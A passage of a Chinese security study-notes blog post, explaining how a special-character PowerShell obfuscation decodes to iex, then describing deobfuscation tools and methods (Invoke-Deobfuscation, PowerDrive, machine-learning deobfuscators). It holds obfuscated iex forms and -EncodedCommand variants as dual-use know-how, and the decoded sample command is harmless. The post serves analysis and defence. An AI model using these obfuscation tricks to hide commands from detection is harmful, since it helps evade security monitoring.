+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$!-&#125; = 8</span><br><span class="line">$&#123;;/=&#125; = 0</span><br><span class="line">$&#123;-&#125;   = 1</span><br><span class="line">$&#123;/&#125;   = 2</span><br><span class="line">$&#123;(&#125;   = 3</span><br><span class="line">$&#123;#&#125;   = 4</span><br><span class="line">$&#123;.&#125;   = 5</span><br><span class="line">$&#123;)@&#125;  = 6</span><br><span class="line">$&#123;!&#125;   = 7</span><br><span class="line">$&#123;;~+&#125; = 8</span><br><span class="line">$&#123;@&#125;   = 9</span><br></pre></td></tr></table></figure>
+<p>（3）由于<code>&quot;$(@&#123;&#125;)&quot;</code>返回<code>System.Collections.Hashtable</code>，<code>&quot;$?&quot;</code>返回<code>True</code>，因此有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;[$ &#125; = &quot;[&quot;+  &quot;$(  @&#123;&#125;  )&quot;[  $&#123;!&#125;]  +&quot;$(@&#123;&#125;)&quot;[&quot;$&#123;-&#125;&quot;+&quot;$&#123;@&#125;&quot;]+&quot;$(@&#123;  &#125;)  &quot;[&quot;$&#123;/&#125;&quot;  +&quot;$&#123;;/=&#125;&quot;  ]+&quot;$?&quot;[$&#123;-&#125;  ]+&quot;]&quot;</span><br><span class="line">       = &quot;[&quot; + &quot;System.Collections.Hashtable&quot;[7] + &quot;System.Collections.Hashtable&quot;[19] + &quot;System.Collections.Hashtable&quot;[20] + &quot;True&quot;[1] + &quot;]&quot;</span><br><span class="line">       = &quot;[Char]&quot;</span><br></pre></td></tr></table></figure>
+<p>&emsp;类似的分析，得到<code>$&#123;$!-&#125;=iex</code>，最后执行的指令为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.iex(mkdir onlyf8 | iex)</span><br></pre></td></tr></table></figure>
+<p>注：BlobRunner可以调试shellcode。</p>
+<h2 id="powershell-反混淆"><a href="#powershell-反混淆" class="headerlink" title="powershell 反混淆"></a>powershell 反混淆</h2><h4 id="基于AST和语义保持的反混淆（Invoke-Deobfuscation-工具）"><a href="#基于AST和语义保持的反混淆（Invoke-Deobfuscation-工具）" class="headerlink" title="基于AST和语义保持的反混淆（Invoke-Deobfuscation 工具）"></a>基于AST和语义保持的反混淆（Invoke-Deobfuscation 工具）</h4><p>&emsp;现有方法反混淆主要分为三个步骤，即<code>识别混淆脚本片段、还原混淆和重构脚本</code>。</p>
+<p>&emsp;在<code>识别混淆脚本片段</code>上，PowerDecode设计了一组正则表达式来匹配，但它们经常识别出带有无效语法的错误脚本片段；李振源等人使用基于机器学习的分类器来识别混淆脚本片段，其使用抽象语法树（AST）节点的特征来识别具有有效语法的混淆片段，这在很大程度上取决于训练数据的质量。</p>
+<p>&emsp;在<code>还原混淆</code>方面，有3种方法：<code>预定义还原规则、函数重载和直接执行</code>。预定义的还原规则按照混淆的类型模拟还原过程，对于一些特定的混淆技术非常有效，但经常因忽略混淆脚本片段的语法而得到错误的结果。函数重载用于处理特定函数的混淆参数，如Invoke-Expression，它拦截目标函数并捕获它们经过多次反混淆的运行时参数。直接执行是另一种处理混淆脚本片段的方法，但是，由于缺少上下文，该方法无法正确处理带变量的混淆片段。</p>
+<p>&emsp;现有的<code>脚本重构方法</code>都是上下文无关的，因此它们最终的反混淆脚本可能不符合语法或在语义上不一致。它们替换脚本中所有相同的混淆片段，这会忽略这些片段的不同上下文，并可能改变脚本的语义。</p>
+<p>&emsp;Invoke-Deobfuscation做了如下几件事：（1）根据脚本 AST 的标记和可还原节点识别混淆的脚本片段；（2）跟踪变量以获取混淆脚本片段的上下文；（3）基于AST的后序遍历重构脚本。</p>
+<p>&emsp;Invoke-Deobfuscation的反混淆过程可以分为三个阶段：Token解析、基于AST的变量跟踪和还原、重命名和重排版。</p>
+<h5 id="Token解析"><a href="#Token解析" class="headerlink" title="Token解析"></a>Token解析</h5><p>&emsp;基于Microsoft的官方库<code>System.Management.Automation.PSParser</code>对ps脚本进行标记化，Token包含文本内容、起始偏移、长度等许多属性。之后，利用Token的属性来还原原始Token并将它们组合起来形成反混淆脚本。如下图所示：</p>
+<p><img src="/images/ps-obfuscation/image-20231015184907321.png" alt="image-20231015184907321" style="zoom:67%;" /></p>
+<p>&emsp;如果一个Token的类型是命令，它的内容是一个别名，如上图中的命令IeX，将用全称Invoke-Expression替换它。可以在Token级别处理其他混淆，例如随机大小写。处理完一个混淆的Token后，我们将在脚本中将其替换为它的还原结果。逆序处理可以<code>识别未处理的Token而不需要重新解析新产生的脚本</code>。</p>
+<h5 id="基于AST的还原"><a href="#基于AST的还原" class="headerlink" title="基于AST的还原"></a>基于AST的还原</h5><p>&emsp;混淆脚本包括包括混淆数据及其还原算法。反混淆的关键是<code>在混淆脚本中识别这些可还原的片段</code>。</p>
+<p>（1）识别可还原的片段</p>
+<p>&emsp;<code>使用 PowerShell AST 上特定类型节点的内容来识别可还原的脚本片段</code>。首先，PowerShell脚本的AST各节点内容语法有效，包含可还原的脚本片段。其次，通过执行可还原的片段来获得原始片段。例如，”he”+”llo”可以执行得到”hello”。因此，我们对PowerShell AST中的所有节点类型进行分析，找出其内容在执行后往往能得到字符串形式结果的节点类型。我们称这些类型的节点为可还原节点，包括PipelineAst、UnaryExpressionAst、BinaryExpressionAst、ConvertExpressionAst、InvokeMemberExpressionAst和SubExpressionAst 。最后，<code>可还原节点的内容提取为可还原片段</code>。</p>
+<p>（2）基于调用的还原</p>
+<p>&emsp;<code>通过Invoke函数执行可还原的脚本片段以获得它们的还原结果</code>。可还原的脚本片段可能包含与还原过程无关的命令，例如Restart-Computer、Start-Sleep等。因此，创建这些命令的黑名单以加速反混淆。</p>
+<p>（3）变量追踪</p>
+<p>&emsp;由于<code>缺少上下文</code>，无法直接执行包含变量的可还原片段来获得正确的还原结果，因此，<code>使用符号表来记录脚本中出现的变量的范围和值</code>。变量分为局部变量、全局变量和环境变量三种类型。后序遍历AST，记录下当前访问节点的作用域。只有在访问NamedblockAst、IfStatementAst、WhileStatementAst、ForStatementAst、ForEachStatementAst和StatementBlockAst六种节点时，当前节点作用域的深度将变化。</p>
+<p>&emsp;通过执行变量的赋值表达式将变量的值记录在符号表中。基于 AssignmentStatement 节点，可以识别变量及其赋值表达式。</p>
+<p>（4）Invoke-Expression 和 PowerShell</p>
+<p>&emsp;混淆脚本通常包含<code>多层混淆</code>，其典型特征是包含Invoke-Expression cmdlet或PowerShell。Invoke-Expression和PowerShell都可以将它们的字符串参数作为脚本运行。攻击者经常使用不同的方法来混淆这些命令。例如，混淆片段<code>.($pshome[4]+$pshome[30]+&quot;x&quot;)</code>等同于Invoke-Expression，使用变量追踪可以得到还原结果<code>.(&quot;iex&quot;)</code>，这是Invoke-Expression的常见格式。Invoke-Expression的其他常见格式包括<code>iex</code>、<code>&quot;xxx&quot;|iex</code>和<code>&amp;&quot;iex&quot;</code>。</p>
+<p>&emsp;PowerShell可以使用参数<code>-EncodedCommand</code>执行Base64编码的命令。由于PowerShell的<code>自动补全和大小写不敏感</code>，该参数可以用于多种格式，如-e、-eNc等。我们将参数转换为小写并使用<code>&quot;-encodedcommand&quot;.StartsWith($param)</code>判断参数是否为<code>-EncodedCommand</code>。</p>
+<p>（5）脚本重构</p>
+<p>&emsp;基于 AST 的<code>后序遍历</code>重构反混淆脚本，当访问一个节点时，我们首先使用它的子节点的内容来更新它的内容，以确保在访问它时，它的所有子节点都已经处理完毕。如果其内容被混淆，我们将用其还原结果替换它。最终，当我们访问 AST 的根节点时，将获得整个反混淆脚本。</p>
+<h5 id="重命名和重排版"><a href="#重命名和重排版" class="headerlink" title="重命名和重排版"></a>重命名和重排版</h5><p>&emsp;随机命名变量和函数的重命名以及代码的重排版可以使脚本更易于分析人员分析。使用<code>统计分析</code>来确定变量名称函数名称是否是随机的，并用预定义的规则替换随机名称。</p>
+<p>（1）将脚本中所有唯一的变量名和函数名提取出来，看成是一个完整的字符串。根据元音和特殊字符的比例来判断字符串是否随机。Hayden指出在通用美式英语中元音的比例约为37.4%，因此当英文字符中元音的比例不在32%和42%之间时，我们假设字符串是随机的。</p>
+<p>（2）对于非英文字母的特殊字符，我们将来自GitHub的4234个正常PowerShell脚本与我们收集到的恶意脚本进行统计对比，发现正常脚本中英文字母的比例大于70%，而非英文字母的特殊字符比例小于 2%。因此，当一个字符串的英文字母比例小于10% 时，我们假设该字符串是随机的。</p>
+<p>（3）使用<code>var_&#123;num&#125;</code>和<code>func_&#123;num&#125;</code>替换随机变量和函数名称，新名称取决于该变量或函数在混淆脚本片段出现的顺序。</p>
+<h4 id="日志去混淆"><a href="#日志去混淆" class="headerlink" title="日志去混淆"></a>日志去混淆</h4><p>&emsp;powershell日志记录了执行ps指令的过程，因此可以通过日志查看真实执行的ps指令。</p>
+<h4 id="PowerDrive工具-去混淆原理"><a href="#PowerDrive工具-去混淆原理" class="headerlink" title="PowerDrive工具-去混淆原理"></a>PowerDrive工具-去混淆原理</h4><p><img src="/images/ps-obfuscation/image-20231016135538877.png" alt="image-20231016135538877" style="zoom:67%;" /></p>
+<p>&emsp;PowerDrive由<code>预处理模块、去混淆模块、反调试检测模块、执行脚本模块</code>4个模块组成。各个模块功能为：</p>
+<ul>
+<li>预处理模块：将多行转换成一行，去除不可见的ASCII字符，检查符号是否正确。</li>
+<li>去混淆模块：（1）使用正则来匹配需要重新排序的字符串，并进行重新排序。（2）使用Invoke-Expression将混淆后的字符串作为命令运行，字符串就会被自动去混淆。</li>
+<li>反调试检测模块：检测sleep指令、检测恶意软件的输出是否被重定向到空输出、检测死循环、检测是否使用try-catch模块来引发异常。</li>
+<li>执行脚本模块：主要是检索后续阶段的有效载荷，钩取Invoke-WebRequest、 Invoke-Rest和New-Object来提取脚本关联的其他可执行文件。</li>
+</ul>
+<h4 id="机器学习去混淆"><a href="#机器学习去混淆" class="headerlink" title="机器学习去混淆"></a>机器学习去混淆</h4><p>&emsp;构建分类器（File Status Classifier）来确定样本是否被编码、混淆或是明文。然后循环应用解码和反混淆逻辑，并且检查每次的输出以确定是否需要下一次操作。最后，用cleanup神经网络来修正无法处理的特殊位。如下所示：</p>
+<p><img src="/images/ps-obfuscation/image-20231016151347423.png" alt="image-20231016151347423" style="zoom:67%;" /></p>
+<h5 id="构建-Status-Classifier"><a href="#构建-Status-Classifier" class="headerlink" title="构建 Status Classifier"></a>构建 Status Classifier</h5><p>&emsp;其步骤为：（1）收集含有标签的样本（比如，十六进制编码、混淆、明文等）；（2）对样本生成数字特征；（3）进行训练。</p>
+<p>&emsp;针对（1），通过爬虫抓取github ps样本，并生成混淆与编码样本。</p>
+<p>&emsp;针对（2），以样本为输入，使用LSTM，生成样本数字特征。</p>
+<h5 id="构建-De-encoder"><a href="#构建-De-encoder" class="headerlink" title="构建 De-encoder"></a>构建 De-encoder</h5><p>&emsp;使用正则表达式来进行模式匹配，从而解码。</p>
+<h5 id="构建-Deobfuscator"><a href="#构建-Deobfuscator" class="headerlink" title="构建 Deobfuscator"></a>构建 Deobfuscator</h5><p>&emsp;大部分可以通过简单逻辑来处理：连接字符串，移除反引号，替换变量等。</p>
+<p>&emsp;对于基于<code>-f</code>的字符串进行重新排序，步骤如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 找出-f或-F；</span><br><span class="line">2. 找出所有-f之前的&#123;[0-9]+&#125;类型的占位符</span><br><span class="line">3. 找出所有-f之后的所有的字符串和有效的非字符串值</span><br><span class="line">4. 用值替换占位符</span><br><span class="line">5. 在同一行进行多次循环</span><br></pre></td></tr></table></figure>
+<h5 id="构建-Cleanup-Network"><a href="#构建-Cleanup-Network" class="headerlink" title="构建 Cleanup Network"></a>构建 Cleanup Network</h5><p>&emsp;被Cleanup Network处理前，可能包含很多令人费解的字符串，例如<code>MOdULEDiRectORy</code>。使用Seq2Seq（翻译中经常用到），针对减少错误的预测结果，步骤如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 找出混淆后脚本和非混淆脚本中对应的单词</span><br><span class="line">2. 找出可能被混淆的变量和关键词</span><br><span class="line">3. 用混淆后脚本中单词作为输入，非非混淆脚本中单词作为期望输出</span><br><span class="line">4. 用之前的预测和新的输入数据预测下一个字符</span><br></pre></td></tr></table></figure>
+<h4 id="其他工具去混淆"><a href="#其他工具去混淆" class="headerlink" title="其他工具去混淆"></a>其他工具去混淆</h4><p>（1）静态规则检测：Flerken</p>
+<p>（2）混淆还原：powershellprofiler</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a target="_blank" rel="noopener" href="https://rootclay.gitbook.io/powershell-attack-guide/jin-jie-pian/9.-hun-xiao">https://rootclay.gitbook.io/powershell-attack-guide/jin-jie-pian/9.-hun-xiao</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://onlyf8.com//powershell-obfuscationEN">https://onlyf8.com//powershell-obfuscationEN</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://www.secrss.com/articles/52662">https://www.secrss.com/articles/52662</a></p>
+<p>[4] <a target="_blank" rel="noopener" href="https://www.ctfiot.com/41643.html">https://www.ctfiot.com/41643.html</a></p>
+<p>[5] <a target="_blank" rel="noopener" href="https://www.secrss.com/articles/20119">https://www.secrss.com/articles/20119</a></p>
+<p>[6] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2923">https://xz.aliyun.com/t/2923</a></p>
+<p>[7] <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1639161">https://cloud.tencent.com/developer/article/1639161</a></p>
+
+  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/10/18/Password-Stealing-without-Hacking/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/10/13/muraen-source-code-reading/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+
+
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    <!-- 
+    <div id="disqus_thread" class="ds-thread">
+        <script type="text/javascript">
+            /**
+             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+             */
+                /*
+                 var disqus_config = function () {
+                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
+                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                 };
+                 */
+            (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document, s = d.createElement('script');
+
+                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';
+
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
+                Disqus.</a></noscript>
+    </div> -->
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
+            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
+        })
+    </script>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-10-15 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/study-notes/">study-notes<span>17</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#powershell%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8F%8D%E6%B7%B7"><span class="toc-article-text">powershell混淆与反混</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#powershell%E4%BD%BF%E7%94%A8%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-article-text">powershell使用的参数</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ExecutionPolicy"><span class="toc-article-text">ExecutionPolicy</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#EncodedCommand"><span class="toc-article-text">EncodedCommand</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NonInteractive-NonI"><span class="toc-article-text">NonInteractive(NonI)</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NoProfile%EF%BC%88NoP%EF%BC%89"><span class="toc-article-text">NoProfile（NoP）</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Sta"><span class="toc-article-text">Sta</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-article-text">总结</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#powershell%E6%B7%B7%E6%B7%86%E6%8A%80%E6%B3%95%EF%BC%88%E7%BB%95%E8%BF%87%E6%8A%80%E6%B3%95%EF%BC%89"><span class="toc-article-text">powershell混淆技法（绕过技法）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8E%BB%E9%99%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-article-text">去除关键字</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C"><span class="toc-article-text">字符串操作</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%93%BE%E6%8E%A5"><span class="toc-article-text">链接</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9B%BF%E6%8D%A2"><span class="toc-article-text">替换</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99"><span class="toc-article-text">大小写</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-article-text">空格</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E4%B8%BA%E5%91%BD%E4%BB%A4"><span class="toc-article-text">字符串转为命令</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8Invoke%E6%96%B9%E6%B3%95"><span class="toc-article-text">使用Invoke方法</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8NewScriptBlock%E5%91%BD%E4%BB%A4"><span class="toc-article-text">使用NewScriptBlock命令</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8invoke-command-xxx-%EF%BC%88icm%EF%BC%89%E5%91%BD%E4%BB%A4"><span class="toc-article-text">使用invoke-command{xxx}（icm）命令</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%98%E9%87%8F%E6%9B%BF%E4%BB%A3"><span class="toc-article-text">变量替代</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E4%BD%BF%E7%94%A8%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="toc-article-text">关键字使用单双引号</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BD%AC%E4%B9%89"><span class="toc-article-text">转义</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-article-text">使用通配符*</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8A%A8%E6%80%81%E5%8F%98%E9%87%8F%E6%B7%B7%E6%B7%86"><span class="toc-article-text">动态变量混淆</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%98%E9%87%8F%E4%BC%A0%E9%80%92"><span class="toc-article-text">变量传递</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%8D%E8%BD%AC"><span class="toc-article-text">字符串反转</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#base64%E7%BC%96%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-article-text">base64编码执行</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8A%A0%E5%AF%86"><span class="toc-article-text">加密</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#IEX%E7%AD%89%E5%91%BD%E4%BB%A4%E7%9A%84%E6%9B%BF%E4%BB%A3"><span class="toc-article-text">IEX等命令的替代</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E6%B7%B7%E6%B7%86"><span class="toc-article-text">特殊字符混淆</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#powershell-%E5%8F%8D%E6%B7%B7%E6%B7%86"><span class="toc-article-text">powershell 反混淆</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%9F%BA%E4%BA%8EAST%E5%92%8C%E8%AF%AD%E4%B9%89%E4%BF%9D%E6%8C%81%E7%9A%84%E5%8F%8D%E6%B7%B7%E6%B7%86%EF%BC%88Invoke-Deobfuscation-%E5%B7%A5%E5%85%B7%EF%BC%89"><span class="toc-article-text">基于AST和语义保持的反混淆（Invoke-Deobfuscation 工具）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#Token%E8%A7%A3%E6%9E%90"><span class="toc-article-text">Token解析</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E5%9F%BA%E4%BA%8EAST%E7%9A%84%E8%BF%98%E5%8E%9F"><span class="toc-article-text">基于AST的还原</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E9%87%8D%E5%91%BD%E5%90%8D%E5%92%8C%E9%87%8D%E6%8E%92%E7%89%88"><span class="toc-article-text">重命名和重排版</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%97%A5%E5%BF%97%E5%8E%BB%E6%B7%B7%E6%B7%86"><span class="toc-article-text">日志去混淆</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#PowerDrive%E5%B7%A5%E5%85%B7-%E5%8E%BB%E6%B7%B7%E6%B7%86%E5%8E%9F%E7%90%86"><span class="toc-article-text">PowerDrive工具-去混淆原理</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%8E%BB%E6%B7%B7%E6%B7%86"><span class="toc-article-text">机器学习去混淆</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%9E%84%E5%BB%BA-Status-Classifier"><span class="toc-article-text">构建 Status Classifier</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%9E%84%E5%BB%BA-De-encoder"><span class="toc-article-text">构建 De-encoder</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%9E%84%E5%BB%BA-Deobfuscator"><span class="toc-article-text">构建 Deobfuscator</span></a></li><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#%E6%9E%84%E5%BB%BA-Cleanup-Network"><span class="toc-article-text">构建 Cleanup Network</span></a></li></ol></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7%E5%8E%BB%E6%B7%B7%E6%B7%86"><span class="toc-article-text">其他工具去混淆</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-article-text">参考链接</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+
+	<!-- copyright -->
+	<div>
+    <ul class="post-copyright">
+      <li class="post-copyright-author">
+      <strong>作者:  </strong>wd-z711</a>
+      </li>
+      <li class="post-copyright-link">
+      <strong>文章链接:  </strong>
+      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明:   </strong>
+        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+        许可协议。转载请注明出处!
+      </li>
+    </ul>
+  <div>
+ 	
+
+		
+
+
+</div><!-- row -->
+
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2023 wd-z711
+  
+      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
+     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->
+
+     <!-- <script type="text/javascript">
+      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+      
+      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
+    </script> -->
+    </p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+   </html>
